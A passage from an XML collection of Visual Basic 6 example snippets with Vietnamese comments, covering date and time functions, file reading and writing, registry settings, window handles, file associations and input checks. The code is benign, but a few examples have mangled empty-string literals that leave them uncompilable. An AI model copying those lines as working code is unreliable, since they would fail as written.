Dim Msg
    TheDate = InputBox("Enter a date") 
    Msg = "Days from today: " &amp; DateDiff("d", Now, TheDate)
    MsgBox Msg
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000079</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim TheDate As Date
Dim Msg
    TheDate = InputBox("Enter a date:") ' 08/10/2003
    Msg = "Quarter: " &amp; DatePart("d", TheDate) ' Returns 10
    Msg = "Quarter: " &amp; DatePart("m", TheDate) ' Returns 08
    MsgBox Msg
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000080</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyDate
    MyDate = DateSerial(2003, 8, 10)    ' Return 8/10/2003
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000081</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyDate
    MyDate = DateValue("August 10, 2003")   ' Return 8/10/2003
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000082</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyDate, MyDay
    MyDate = #8/10/2003#  ' Khoi tao
    MyDay = Day(MyDate)   ' Returns 10
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000083</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyTime, MyHour
    MyTime = #4:35:17 PM#   ' Khoi tao
    MyHour = Hour(MyTime)   ' Returns 16
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000086</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyMonth
    MyMonth = MonthName("4", True) 'Returns Apr
    MyMonth = MonthName("4") ' Returns April
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000087</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim TheDate As Date
Dim Msg
    TheDate = InputBox("Enter a date") 
    Msg = "Days from today: " &amp; DateDiff("d", Now, TheDate)
    MsgBox Msg
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000089</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyTime
    MyTime = TimeSerial(16, 35, 17) ' Returns 4:35:17 PM.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000090</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyTime
    MyTime = TimeValue("4:35:17 PM")   ' Returns 4:35:17 PM
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000091</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyDate, MyWeekDay, MyNameWeekDay
    MyDate = #8/10/2003#           ' Khoi tao
    MyWeekDay = Weekday(MyDate)   ' Returns 1
    MyNameWeekDay = WeekdayName(MyWeekDay, True) 'Returns "Sun"
    MyNameWeekDay = WeekdayName(MyWeekDay) 'Returns "Sunday"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000092</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyDate, MyWeekDay, MyNameWeekDay
    MyDate = #8/10/2003#           ' Khoi tao
    MyWeekDay = Weekday(MyDate)   ' Returns 1
    MyNameWeekDay = WeekdayName(MyWeekDay, True) 'Returns "Sun"
    MyNameWeekDay = WeekdayName(MyWeekDay) 'Returns "Sunday"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000094</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim InputData
    Open "MYFILE" For Input As #1   ' Mo file de doc
        Do While Not EOF(1)   ' Kiem tra xem file da ket thuc chua
            Line Input #1, InputData   ' Doc tung dong
            Debug.Print InputData   ' in ra tung dong
        Loop
    Close #1   ' Dong file
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000095</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim FileNum, Mode, Handle
    FileNum = 1   ' Khoi tao
    Open "TESTFILE" For Append As FileNum   ' Mo File
        Mode = FileAttr(FileNum, 1)   ' Returns 8 (Append file)
        Handle = FileAttr(FileNum, 2)   ' Returns file handle.
    Close FileNum   ' Close file.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000096</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyIndex, FileNumber
    For MyIndex = 1 To 5
        FileNumber = FreeFile   ' Gan FileNumber = Trong
        Open "TEST" &amp; MyIndex For Output As #FileNumber   ' mo file
            Write #FileNumber, "This is a sample."   ' Ghi vào file
        Close #FileNumber   ' Dong file
    Next MyIndex
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000097</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyChar
    Open "TESTFILE" For Input As #1   ' Mo file.
        Do While Not EOF(1)
            MyChar = Input(1, #1)   ' Lay 1 ki tu
            Debug.Print MyChar   ' In ra man hinh
        Loop
    Close #1   ' Dong file.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000098</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim TextLine
    Open "TESTFILE" For Input As #1   ' Mo file.
        Do While Not EOF(1)
            Line Input #1, TextLine   ' Doc tung dong gan vao bien TextLine
            Debug.Print TextLine   ' In ra man hinh
        Loop
    Close #1   ' Dong file.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000099</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyLocation, MyLine
    Open "TESTFILE" For Binary As #1   ' Mo file
        Do While MyLocation &lt; LOF(1)   ' Lap cho den khi MyLocation = chieu dai #1
            MyLine = MyLine &amp; Input(1, #1)   ' Doc tung ki tu
            MyLocation = Loc(1)   ' Cap nhat lai vi tri byte
            Debug.Print MyLine; Tab; MyLocation ' in ra man hinh
        Loop
    Close #1   ' Dong file.
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000100</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim FileLength
    Open "TESTFILE" For Input As #1   ' Mo file
        FileLength = LOF(1)   ' Lay kich thuoc file
    Close #1   ' Dong file.
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000101</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
    Open "TESTFILE" For Output As #1   ' Mo file de nhap
        Print #1, "This is a test"   'Dong 1
        Print #1,   ' Nhap vao 1 dong trang
        Print #1, "Zone 1"; Tab; "Zone 2"    ' Zone 1 cach Zone 2 1 khoang tab
        Print #1, "Hello"; " "; "World"     ' Returns "Hello World"
        Print #1, Spc(5); "5 leading spaces "    ' Returns "     5 leading spaces"
        Print #1, Tab(10); "Hello"     ' 1 khoang tab 10 khoang trang
    Close #1   ' Dong file
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000102</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim FileNumber
    For FileNumber = 1 To 5
        Open "TEST" &amp; FileNumber For Output As #FileNumber ' Mở file
            Write #FileNumber, "Hello World"   ' Ghi dữ liệu vào file.
    Next FileNumber
    Reset   ' Đóng file và cập nhật dữ liệu vào file
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000103</MaVD>
    <NoiDung>Option Explicit
Type Record
   ID As Integer
   Name As String * 20
End Type
Private Sub Form_Load()
Dim MyRecord As Record
    Open "TESTFILE" For Random As #1 Len = Len(MyRecord) ' Mo file
        Do While Not EOF(1)   ' Lap cho den khi ket thuc file
           Get #1,, MyRecord   ' Doc mau tin
           Debug.Print Seek(1)   ' In so mau tin
           'Seek #1, 3                'Trỏ tới vị trí mẫu tin thứ 3 
        Loop
    Close #1   ' Dong file.
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000104</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyValue
    Randomize   ' khoi tao bo phat so ngau nhien
    MyValue = Int((6 * Rnd) + 1) 'Returns tu 1 den 6
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000105</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyValue
    Randomize   ' khoi tao bo phat so ngau nhien
    MyValue = Int((6 * Rnd) + 1) 'Returns tu 1 den 6
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000106</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
    Me.BackColor = QBColor(1) 'Returns Blue
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000107</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
    Me.BackColor = RGB(255, 0, 0) 'Returns Red
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000108</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
    ' luu mot thong tin registry moi
    SaveSetting appname:="MyApp", section:="Startup", _
            Key:="Top", setting:=75
    SaveSetting "MyApp", "Startup", "Left", 50
    ' Xoa key Startup trong MyApp
    DeleteSetting "MyApp", "Startup"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000109</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MySettings As Variant, intSettings As Integer
    ' luu mot thong tin registry moi
    SaveSetting appname:="MyApp", section:="Startup", _
    Key:="Top", setting:=75
    SaveSetting "MyApp", "Startup", "Left", 50
    'Lay thong tin registry
    MySettings = GetAllSettings(appname:="MyApp", section:="Startup")
    'Duyet qua va in ra tung hang trong MyApp
    For intSettings = LBound(MySettings, 1) To UBound(MySettings, 1)
        Debug.Print MySettings(intSettings, 0), MySettings(intSettings, 1)
    Next intSettings
    'Xoa registry
    DeleteSetting "MyApp", "Startup"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000110</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MySettings As Variant
    'Luu mot thong tin registry moi
    SaveSetting "MyApp", "Startup", "Top", 75
    SaveSetting "MyApp", "Startup", "Left", 50
    'In ra man hinh thong tin registry vua tao
    Debug.Print GetSetting(appname:="MyApp", section:="Startup", _
                       Key:="Left", Default:="25") 
    'Xoa registry
    DeleteSetting "MyApp", "Startup"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000111</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
    ' luu mot thong tin registry moi
    SaveSetting appname:="MyApp", section:="Startup", _
            Key:="Top", setting:=75
    SaveSetting "MyApp", "Startup", "Left", 50
    ' Xoa key Startup trong MyApp
    DeleteSetting "MyApp", "Startup"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000112</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyAppID, ReturnValue
    AppActivate "Microsoft Word"   ' Activate Microsoft
    ' Ham AppActivate co the su dung gia tri do hm shell tra ve
    MyAppID = Shell("C:\WORD\WINWORD.EXE", 1)   ' Run Microsoft Word.
    AppActivate MyAppID   ' Activate Microsoft
   ' Word.
    ReturnValue = Shell("c:\EXCEL\EXCEL.EXE", 1)  ' Run Microsoft Excel.
    AppActivate ReturnValue   ' Activate Microsoft
   ' Excel.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000113</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim ReturnValue, I
    ReturnValue = Shell("CALC.EXE", 1)   ' Run Calculator.
    AppActivate ReturnValue    ' Activate Calculator.
    'Gui mot day phep cong tu 1 den 100
    For I = 1 To 100   '
        SendKeys I &amp; "{+}", True
    Next I
    SendKeys "=", True   ' Tinh ket qua
    SendKeys "%{F4}", True   ' ALT+F4 de dong chuong trinh
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000114</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyAppID, ReturnValue
    AppActivate "Microsoft Word"   ' Activate Microsoft
    ' Ham AppActivate co the su dung gia tri do hm shell tra ve
    MyAppID = Shell("C:\WORD\WINWORD.EXE", 1)   ' Run Microsoft Word.
    AppActivate MyAppID   ' Activate Microsoft
   ' Word.
    ReturnValue = Shell("c:\EXCEL\EXCEL.EXE", 1)  ' Run Microsoft Excel.
    AppActivate ReturnValue   ' Activate Microsoft
   ' Excel.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000116</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim Result
    ' Gan thuoc tinh MousePointer cua Text1 = vbCrosshair
    CallByName Text1, "MousePointer", VbLet, vbCrosshair
    'Lay thuoc tinh MousePointer hien tai cua Text1
    Result = CallByName(Text1, "MousePointer", VbGet)
    'Di chuyen Text1 den vi tri 100, 100
    CallByName Text1, "Move", VbMethod, 100, 100
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000117</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim Result
    Result = Choose(1, "Speedy", "United", "Federal") 'Returns Speedy
    Result = Choose(3, "Speedy", "United", "Federal") 'Returns Federal
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000118</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim EnvString, Indx, Msg, PathLen   ' Declare variables.
    Indx = 1
    Do
        EnvString = Environ(Indx)   ' Lay ten environment
        ' Kiem tra duong dan co ton tai khong
        If Left(EnvString, 5) = "PATH=" Then
            PathLen = Len(Environ("PATH")) ' lay chieu dai duong dan
            Msg = "PATH entry = " &amp; Indx &amp; " and length = " &amp; PathLen
            Exit Do
        Else
            Indx = Indx + 1   ' Tiep tu voi cac environment khac
        End If
    Loop Until EnvString = "
    If PathLen &gt; 0 Then
        MsgBox Msg
    Else
        MsgBox "Khong co Path environment nao ton tai."
    End If
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000119</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim Result, TestMe
    TestMe = 1100
    Result = IIf(TestMe &gt; 1000, "Large", "Small") ' Returns Large
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000120</MaVD>
    <NoiDung>Option Explicit
Function MatchUp(CityName As String)
   MatchUp = Switch(CityName = "London", "English", CityName _
               = "Rome", "Italian", CityName = "Paris", "French")
End Function
Private Sub Form_Load()
Dim Result
    Result = MatchUp("London") ' Returns English
    Result = MatchUp("Rome") ' Returns Italian
    Result = MatchUp("Paris") ' Returns French
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000121</MaVD>
    <NoiDung>'Module code: 
Public Enum StrCodes
  strALPHABETIC = 1
  strNUMERIC = 2
  strWHOLENUM = 3
  strALPHANUMERIC = 4
  strALPHASPACE = 5
  strALPHANUMSPACE = 6
  strALLCHARS = 7
  strSPECIALCHAR = 8
  strEMPTYSTRING = 9
  strNULLSTRING = 10
  strOVERFLOWNUM = 11
End Enum
Public Function EvalString(ByVal Str As String) As StrCodes
   Dim ANum As Double
   On Error GoTo NumError
   If IsNull(Str) Then EvalString = strNULLSTRING: Exit Function
   If Str = " Then EvalString = strEMPTYSTRING: Exit Function
   ANum = Int(Str)
   If InStr(1, Str, ".", vbTextCompare) &gt; 0 Or InStr(1, Str, "E", vbTextCompare) &gt; 0 Then
   EvalString = strNUMERIC
   Exit Function
   Else
   EvalString = strWHOLENUM
   Exit Function
   End If
   
   NotNumeric:
   Dim pix As Integer
   Dim piAsc As Integer
   Dim pbAlphaFlag As Boolean
   Dim pbNumFlag As Boolean
   Dim pbSpaceFlag As Boolean
   Dim pbMiscFlag As Boolean
   
   For pix = 1 To Len(Str)
   piAsc = Asc(Mid$(Str, pix, 1))
   If (piAsc &gt;= 65 And piAsc &lt;= 90) Or (piAsc &gt;= 97 And piAsc &lt;= 122) Then
   pbAlphaFlag = True
   ElseIf (piAsc &gt;= 48 And piAsc &lt;= 57) Then
   pbNumFlag = True
   ElseIf (piAsc = 32) Then
   pbSpaceFlag = True
   Else
   pbMiscFlag = True
   End If
   
   If pbAlphaFlag And pbNumFlag And pbMiscFlag Then
   EvalString = strALLCHARS
   Exit Function
   End If
   Next pix
   
   If pbAlphaFlag And Not pbNumFlag And Not pbSpaceFlag And Not pbMiscFlag Then
   EvalString = strALPHABETIC
   Exit Function
   ElseIf pbAlphaFlag And pbNumFlag And Not pbSpaceFlag And Not pbMiscFlag Then
   EvalString = strALPHANUMERIC
   Exit Function
   ElseIf pbAlphaFlag And Not pbNumFlag And pbSpaceFlag And Not pbMiscFlag Then
   EvalString = strALPHASPACE
   Exit Function
   ElseIf pbAlphaFlag And pbNumFlag And pbSpaceFlag And Not pbMiscFlag Then
   EvalString = strALPHANUMSPACE
   Exit Function
   ElseIf Not pbAlphaFlag And Not pbNumFlag And Not pbSpaceFlag And pbMiscFlag Then
   EvalString = strALLCHARS
   End If
   
   Exit Function
   
   NumError:
   If Err.Number = 13 Then
   Resume NotNumeric
   ElseIf Err.Number = 6 Then
   EvalString = strOVERFLOWNUM
   Else
   MsgBox Err.Number &amp; " " &amp; Err.Description, vbExclamation, "String Eval Error"
   End If
End Function

Để kiểm tra kiểu của một chuỗi bạn sử dụng đoạn code sau:

Dim varType As Integer
Dim myVar As String
myVar = "1234"
varType = EvalString(myVar)</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000122</MaVD>
    <NoiDung>Private Sub Form_Load()
   Dim isTrue As Boolean
   isTrue = IsDate("02/29/" &amp; Year(Now))
   If isTrue = True Then
   MsgBox Year(Now) &amp; ": Nam nhuan"
   Else
   MsgBox Year(Now) &amp; ": Khong phai la nam nhuan"
   End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000123</MaVD>
    <NoiDung>Vd 1: lấy handle của cửa sổ soạn thảo văn bản Notepad
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long

Private Sub Command1_Click()
Dim n As Long
    n = FindWindow("Notepad", vbNullString)
    MsgBox "handle = " &amp; n
End Sub
Nếu chúng ta có nhiều cửa sổ ứng dụng Notepad đang mở thì n sẽ lần lượt là handle của từng cửa sổ, giá trị n sẽ là handle của cửa sổ được tìm thấy cuối cùng. (vbNullString: không cho biết tên cụ thể, hàm FindWindow sẽ tìm hết tất cả cửa sổ có class name là Notepad)

Vd 2: lấy handle của cửa sổ có tiêu đề là Untitled - Notepad
Private Sub Command2_Click()
Dim n As Long
    n = FindWindow(vbNullString, "Untitled - Notepad")
    MsgBox "handle = " &amp; n
End Sub
Lần này hàm FindWindow sẽ trả về handle của tất cả cửa sổ nào có tiêu đề là Untitled - Notepad. (vbNullString: không cho biết class name cụ thể, hàm FindWindow sẽ tìm hết trong tất cả các cửa sổ có trên màn hình)
Bạn thử tạo 1 Form có Caption = "Untitled - Notepad". Khi đó n sẽ = handle của Form đó.
Bật chương trình soạn thảo Notepad. Khi đó n sẽ = handle của cửa sổ chương trình Notepad.

Vd 3: Lấy hanlde của trình soạn thảo Notepad có tiêu đề là caulacbovb.txt - Notepad
Private Sub Command3_Click()
Dim n As Long
    n = FindWindow("Notepad", "caulacbovb.txt - Notepad")
    MsgBox "handle = " &amp; n
End Sub
Lần này rỏ ràng bạn thấy là chúng ta có 2 ràng buộc: chỉ lấy handle của trình soạn thảo Notepad nào có tiêu đề thỏa mãn yêu cầu.
Bạn tạo 1 file caulacbovb.txt
Tạo thêm vài file .txt khác nữa, tạo 1 Form có Caption = "caulacbovb. txt - Notepad"
Mở tất cả mấy file đó, bây giờ n sẽ chỉ  là handle của cửa sổ chương trình Notepad có tiêu đề là caulacbovb. txt - Notepad mà thôi.</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000124</MaVD>
    <NoiDung>Đoạn code bên dưới demo cho việc lấy tên lớp của 1 cửa sổ. Bạn nhập chính xác tiêu đề của 1 cửa sổ vào, chương trình sẽ trả lại tên lớp của cửa sổ đó.
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long

Const gcClassnameMSWord = "OpusApp"
Const gcClassnameMSExcel = "XLMAIN"
Const gcClassnameMSIExplorer = "IEFrame"
Const gcClassnameMSVBasic = "wndclass_desked_gsk"
Const gcClassnameNotePad = "Notepad"
Const gcClassnameMyVBApp = "ThunderForm"

Private Sub Form_Load()
    Dim WinWnd As Long, Ret As String, RetVal As Long, lpClassName As String
    'Ask for a Window title
    Ret = InputBox("Enter the exact window title:" + Chr$(13) + Chr$(10) + "Note: must be an exact match")
    'Search the window
    WinWnd = FindWindow(vbNullString, Ret)
    If WinWnd = 0 Then MsgBox "Couldn't find the window ...": Exit Sub
    'Create a buffer
    lpClassName = Space(256)
    'retrieve the class name
    RetVal = GetClassName(WinWnd, lpClassName, 256)
    'Show the classname
    MsgBox "Classname: " + Left$(lpClassName, RetVal)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000125</MaVD>
    <NoiDung>Vào Project / References và chọn Microsoft Access 10.0 Object Library.

Thêm đoạn code sau vào Form:

Private Sub Form_Unload(Cancel As Integer)
                     
    'Nén CSDL tên MyData.mdb và tạo 1 CSDL mới tên DB2.mdb
     DBEngine.CompactDatabase App.Path &amp; "\MyData.mdb", App.Path &amp; "\DB2.mdb"

    'Xóa MyData.mdb
     Kill "MyData.mdb"

    'Đổi tên DB2.mdb thành MyData.mdb
     Dim OldName
     Dim NewName

     OldName = "DB2.mdb": NewName = "MyData.mdb"

     Name OldName As NewName

End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000126</MaVD>
    <NoiDung>Bạn hãy chạy chương trình nào có xuất hiện hộp thoại Msgbox hay Dialogbox (vì 2 cái này có chung classname). Chạy chương trình bên dưới, bạn sẽ thấy sự thay đổi ...

Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Const WM_SETTEXT = &amp;HC
Dim hDlg As Long, hButton As Long

Private Sub Command1_Click()
    'Lấy handle của cửa sổ Dialog bất kỳ có trên màn hình
    hDlg = FindWindow("#32770", vbNullString)
    'Đổi tiêu đề của Dialog đó
    SendMessage hDlg, WM_SETTEXT, 0&amp;, ByVal "Xin chao ban"

    'Lấy handle của nút lệnh bất kỳ trong cửa sổ Dialog
    hButton = FindWindowEx(hDlg, ByVal 0&amp;, "Button", vbNullString)
    'Đổi tên nút lệnh đó
    SendMessage hButton, WM_SETTEXT, 0&amp;, ByVal "Nut lenh"

    'Lấy handle của static box (label) bất kỳ trong cửa sổ Dialog
    hButton = FindWindowEx(hDlg, ByVal 0&amp;, "Static", vbNullString)
    'Đổi dòng văn bản hiển thị của nó
    SendMessage hButton, WM_SETTEXT, 0&amp;, ByVal "www.caulacbovb.com"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000127</MaVD>
    <NoiDung>'Thêm 1 textbox có tên Text1 vào Form
Private Sub Text1_KeyPress(KeyAscii As Integer)
   Dim sTemplate As String
   sTemplate = "!@#$%^&amp;*()_+-="
   If InStr(1, sTemplate, Chr(KeyAscii)) &gt; 0 Then
      KeyAscii = 0
   End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000153</MaVD>
    <NoiDung>Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    Select Case UnloadMode
        Case 0
                'Unload từ control menu của form
                MsgBox "Unload tu control menu cua Form"
                Cancel = True
        Case 1
                'Unload bằng mã: Unload ...
                MsgBox "Unload bang ma"
        Case 2
                'Unload khi Windows Shutdown
                MsgBox "Unload khi Windows Shutdown"
        Case 3
                'Unload bằng TaskManager
                MsgBox "Unload bang TaskManager"
        Case 4
                'Unload khi form MDI unload
                MsgBox "Unload khi dong Form MDI"
    End Select
End Sub
Muốn không cho người dùng đóng bằng trường hợp nào thì đặt Cancel = True vào trường hợp đó.</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000154</MaVD>
    <NoiDung>Module code: 
Public Sub CenterForm(frm As Form) 
   frm.Top = (Screen.Height - frm.Height) / 2 
   frm.Left = (Screen.Width - frm.Width) / 2 
End Sub 

'Nếu muốn Form1 ở giữa màn hình thì: 
Call CenterForm(Form1)</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000155</MaVD>
    <NoiDung>Các hàm API phục vụ cho truy xuất Registry:
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long 
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long 
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long 

' Hằng số của khóa HKEY_CLASSES_ROOT 
Private Const HKEY_CLASSES_ROOT = &amp;H80000000 

Hàm chính:
Public Sub MyAppDefault(ByVal sAppName As String, ByVal sEXE As String, ByVal sExt As String) 
   On Error GoTo TrapIt 
   Dim lRegKey As Long 
   Call RegCreateKey(HKEY_CLASSES_ROOT, sExt, lRegKey) 
   Call RegSetValueEx(lRegKey, ", 0&amp;, 1, ByVal sAppName, Len(sAppName)) 
   Call RegCloseKey(lRegKey) 
   ' adds info into the shell open command
   Call RegCreateKey(HKEY_CLASSES_ROOT, sAppName &amp; "\Shell\Play\Command", lRegKey) 
   Call RegSetValueEx(lRegKey, ", 0&amp;, 1, ByVal sEXE, Len(sEXE)) 
   Call RegCloseKey(lRegKey) 
   Exit Sub 
   TrapIt: MsgBox Err.Description,, " Error" 
End Sub 

Thêm vào trong Form 1 commandbutton (CmdDangky)
Private Sub CmdDangky_Click() 
   ' Làm cho ứng dụng của bạn thành mặc định khi mở file .mp3 
    MyAppDefault "My MP3 Player", chr(34) &amp; App.Path &amp; "\" &amp; App.EXEName _
    &amp; ".exe" &amp; chr(34) &amp; " " &amp; chr(34) &amp; "%1" &amp; chr(34), ".mp3" 
End Sub 

Dịch và chạy thử chương trình, nhấn vào commandbutton. Bắt đầu từ bây giờ mỗi khi bạn DoubleClick lên bất kỳ file .mp3 nào, chương trình mà bạn đã đăng ký ở trên sẽ tự động được mở. Công việc còn lại của bạn là lấy tham số mà Windows truyền vào ứng dụng khi bạn double click lên file .mp3 đó (tham số = tên file .mp3). 
Trong sự kiện Form_Load bạn thêm vào đoạn code lấy tham số được Windows truyền vào: 
Private Sub Form_Load() 
   Dim sFile As String 
   ' Lay tham so truyen vao 
   sFile = Command$() 
   MsgBox "Tập tin được mở là:" &amp; sFile 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000157</MaVD>
    <NoiDung>Private Declare Function GetWinDir Lib "kernel32" Alias "GetWindowsDirectoryA" _ 
   (ByVal lpBuffer As String, ByVal nSize As Long) As Long 
Private Declare Function GetSysDir Lib "kernel32" Alias "GetSystemDirectoryA" _ 
   (ByVal lpBuffer As String, ByVal nSize As Long) As Long 
Private Declare Function GetTempDir Lib "kernel32" Alias "GetTempPathA" _ 
   (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long 
Private Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" _ 
   (ByVal lpBuffer As String, nSize As Long) As Long 
Private Function strWindows() As String 
   Dim stTemp As String 
   stTemp = Space$(100) 
   GetWinDir stTemp, 100 
   strWindows = Left$(Trim(stTemp), Len(Trim(stTemp)) - 1) 
   'hoặc 
   'strWindows = Left(stTemp, InStr(stTemp, vbNullChar) - 1) 
End Function 
Private Function strSystem() As String 
   Dim stTemp As String 
   stTemp = Space$(100) 
   GetSysDir stTemp, 100 
   strSystem = Left$(Trim(stTemp), Len(Trim(stTemp)) - 1) 
End Function 
Private Function strTemp() As String 
   Dim stTemp As String 
   stTemp = Space$(100) 
   GetTempDir 100, stTemp 
   strTemp = Left$(Trim(stTemp), Len(Trim(stTemp)) - 1) 
End Function 
Private Function strComputerName() As String 
   Dim stTemp As String 
   stTemp = Space$(100) 
   GetComputerName stTemp, 100 
   strComputerName = Left$(Trim(stTemp), Len(Trim(stTemp)) - 1) 
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000158</MaVD>
    <NoiDung>'Ẩn
App.TaskVisible = False 
'Hiện
App.TaskVisible = True</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000159</MaVD>
    <NoiDung>Public Function kiemtraemail(EmailAddress As String) As Boolean 
    kiemtraemail = EmailAddress Like "*@[A-Z,a-z,0-9]*.*" 
End Function

Trong Form1 bạn thêm vào đó 1 textbox với thuộc tính name là EmailText dùng để nhập địa chỉ email và 1 command1 để kiểm tra tính hợp lệ của địa chỉ email khi người dùng ấn vào:
Private Sub Command1_Click() 
